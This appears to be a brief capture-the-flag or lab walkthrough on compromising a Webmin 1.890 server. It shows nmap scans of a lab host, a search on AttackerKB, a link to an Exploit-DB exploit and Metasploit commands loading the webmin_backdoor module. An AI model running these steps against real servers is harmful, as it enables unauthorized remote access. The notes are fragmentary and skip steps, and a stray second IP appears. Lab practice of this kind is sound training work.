# AttackerKB 

[AttackerKB](https://attackerkb.com/activity-feed) exploits in your workflow  


## Discovering the Lay of the Land

`:> nmap -Pn -p- 10.64.144.17`

```md
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-29 00:36 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.64.144.17
Host is up (0.00029s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
10000/tcp open  snet-sensor-mgmt
```

`:> nmap -Pn -p 10000 -sV -sC 10.64.144.17`

```md
PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.95 seconds
```

### View the Certificate

![certificate](/assets/attackerkb-101.png)  

Add entry to /etc/hosts file  

## Learning to Fly

Search for `webmin` on [AttackerKB](https://attackerkb.com/activity-feed)  

![search](/assets/attackerkb-102)  

## Blasting Away

10.66.147.8

[Exploit Code](https://www.exploit-db.com/exploits/47230)

`:> msfconsole`  

`:> use exploit/linux/http/webmin_backdoor`  

`:> whoami`